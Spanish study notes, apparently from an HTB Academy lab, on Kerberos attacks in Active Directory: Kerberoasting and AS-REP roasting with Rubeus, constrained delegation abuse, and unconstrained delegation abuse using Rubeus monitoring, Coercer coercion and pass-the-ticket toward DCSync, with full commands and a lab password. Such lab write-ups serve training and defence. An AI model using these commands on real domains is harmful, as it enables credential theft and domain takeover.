herramienta que permite obtener hashes krb del DC

### Ataque Kerberosting
/Rubeus.exe kerberoast /outfile:archivo.txt

![[Pasted image 20260815205007.png]]

### Ataque AS-Reproasting
Podemos obtener hashes crackeables para las cuentas de usuario que tienen habilitada la propiedad `Do not require Kerberos preauthentication` (No requerir preautenticación de Kerberos).
```
/Rubeus.exe asreproast /outfile:archivo.txt
```


### Ataque delegación restringida
Solo mostraremos el abuso de la `delegación restringida`; cuando una cuenta es de confianza para la delegación, la cuenta envía una solicitud al `KDC` (Centro de distribución de claves) que dice: "Dame un tique de Kerberos para el usuario YYYY porque tengo confianza para delegar este usuario en el servicio ZZZZ", y se genera un tique de Kerberos para el usuario YYYY (sin proporcionar la contraseña del usuario YYYY). También es posible delegar en otro servicio, incluso si no está configurado en las propiedades del usuario. Por ejemplo, si tenemos confianza para delegar para `LDAP`, podemos realizar una transición de protocolo (protocol transition) y se nos puede confiar cualquier otro servicio como `CIFS` o `HTTP`.

Entrega usuario y protoloco al que se tiene permiso.
![[Pasted image 20260917120055.png|782]]
Hasheamos la contraseña para usarla en la funcion s4u de rubeus (pide ingreso de hash en vez de contraseña en texto plano)
![[Pasted image 20260917120132.png|603]]

Creación del ticket con rubeus
![[Pasted image 20260917120149.png|832]]
Con el ticket creado, podemos entrar usando la funcion de Enter-PSSession dc1 (funciona tipo ssh)
![[Pasted image 20260917120239.png|440]]

### Ataque delegación no restringida
Para identificar sistemas configurados para `delegación no restringida (Unconstrained Delegation)
```
PS C:\Users\bob\Downloads> Get-NetComputer -Unconstrained | select samaccountname

samaccountname
--------------
DC1$
SERVER01$
WS001$
DC2$
```
`WS001` y `SERVER01` son de confianza para la delegación no restringida (los Controladores de Dominio son de confianza por defecto). Así que tanto WS001 como Server01 serían un objetivo para un adversario. En nuestro escenario, ya hemos comprometido WS001 y a 'Bob', que tiene derechos administrativos en este host. Iniciaremos `Rubeus` en una consola administrativa para monitorizar nuevos inicios de sesión y extraer TGTs:
```
PS C:\Users\bob\Downloads> .\Rubeus.exe monitor /interval:1
```
A continuación, necesitamos saber la dirección IP de WS001, que podemos obtener ejecutando `ipconfig`. Una vez conocida, cambiaremos a la máquina Kali para ejecutar `Coercer` hacia DC1, mientras lo forzamos a conectarse a WS001 si la coacción tiene éxito:
```
Rodign@htb[/htb]$ Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
```

Ahora, si cambiamos a WS001 y miramos la salida continua que `Rubeus` proporciona, debería haber un TGT para DC1 disponible:
Podemos usar este TGT para la autenticación dentro del dominio, convirtiéndonos en el Controlador de Dominio. A partir de ahí, DCSync es un ataque evidente (entre otros).
Una forma de usar el TGT mencionado es a través de Rubeus, como se muestra a continuación.
```
PS C:\Users\bob\Downloads> .\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...
```